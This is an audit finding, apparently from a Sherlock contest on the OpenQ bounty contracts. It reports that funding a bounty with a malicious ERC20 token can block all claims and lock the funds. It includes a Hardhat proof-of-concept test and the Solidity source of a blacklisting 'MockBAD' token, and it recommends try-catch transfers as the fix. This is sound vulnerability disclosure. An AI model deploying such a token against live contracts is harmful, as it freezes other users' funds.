carrot

high

# Bounties can be broken by funding them with malicious ERC20 tokens

## Summary
Any malicious user can fund a bounty contract with a malicious ERC20 contract and prevent winners from withdrawing their rewards.
## Vulnerability Detail
The `DepositManagerV1` contract allows any user to fund any bounty with any token, as long as the following check passes in `fundBountyToken` function
https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/DepositManager/Implementations/DepositManagerV1.sol#L45-L50
This check always passes as long as `tokenAddressLimitReacehd` is false, which will be the case for most cases and is a reasonable assumption to make. 

The claims are handled by the `claimManagerV1` contract, which relies on every single deposited token to be successfully transferred to the target address, as can be seen with the snippet below, taken from the function `_claimAtomicBounty`
https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/ClaimManager/Implementations/ClaimManagerV1.sol#L123-L134
and the `claimBalance` function eventually ends up using the `safeTransfer` function from the Address library to carry out the transfer as seen in `BountyCore.sol:221`
https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Bounty/Implementations/BountyCore.sol#L221-L228
However, if any of the tokens end up reverting during the `safeTransfer` call, the entire claiming call is reverted. It is quite easy for an attacker to fund the bounty with such a malicious contract, and this would essentially brick the bounty preventing the claims from being processed. This will also lock up the funds in the contract until expiry, which can be an indefinite amount of time.

This attack can be carried out in the following bounty types:
1. AtomicBountyV1
2. TieredFixedBounty
3. TieredPercentageBounty

by using malicious ERC20 tokens following the same attack vector.

## Impact
Bricking of bounty and lock up of funds until expiry timestamp
## Code Snippet
The attack can be recreated using the following test snippet
```javascript
it('should revert when holding malicious token', async () => {
          // ARRANGE
          const volume = 100
          await openQProxy.mintBounty(
            Constants.bountyId,
            Constants.organization,
            atomicBountyInitOperation
          )
          const bountyAddress = await openQProxy.bountyIdToAddress(
            Constants.bountyId
          )
          await depositManager.fundBountyToken(
            bountyAddress,
            ethers.constants.AddressZero,
            volume,
            1,
            Constants.funderUuid,
            { value: volume }
          )

          // Attacker funds with bad token
          const attacker = claimantThirdPlace
          const MockBAD = await ethers.getContractFactory('MockBAD')
          const mockBAD = await MockBAD.connect(attacker).deploy()
          await mockBAD.deployed()
          await mockBAD.connect(attacker).approve(bountyAddress, 10000000)
          await depositManager
            .connect(attacker)
            .fundBountyToken(
              bountyAddress,
              mockBAD.address,
              volume,
              1,
              Constants.funderUuid
            )
          // Blacklist malicious token
          await mockBAD.connect(attacker).setBlacklist(bountyAddress)

          // ACT
          await expect(
            claimManager
              .connect(oracle)
              .claimBounty(
                bountyAddress,
                claimant.address,
                abiEncodedSingleCloserData
              )
          ).to.be.revertedWith('blacklisted')
        })
```
Where the `mockBAD` token is defined as follows, with a malicious blacklist:
```solidity
contract MockBAD is ERC20 {
    address public admin;
    address public blacklist;

    constructor() ERC20('Mock DAI', 'mDAI') {
        blacklist = address(1);
        _mint(msg.sender, 10000 * 10 ** 18);
        admin = msg.sender;
    }

    function setBlacklist(address _blacklist) external {
        require(msg.sender == admin, 'only admin');
        blacklist = _blacklist;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(from != blacklist, 'blacklisted');
        super._beforeTokenTransfer(from, to, amount);
    }
}
```

## Tool used
Hardhat
Manual Review

## Recommendation
Use a try-catch block when transferring out tokens with `claimManager.sol`. This will ensure that even if there are malicious tokens, they wont revert the entire transaction.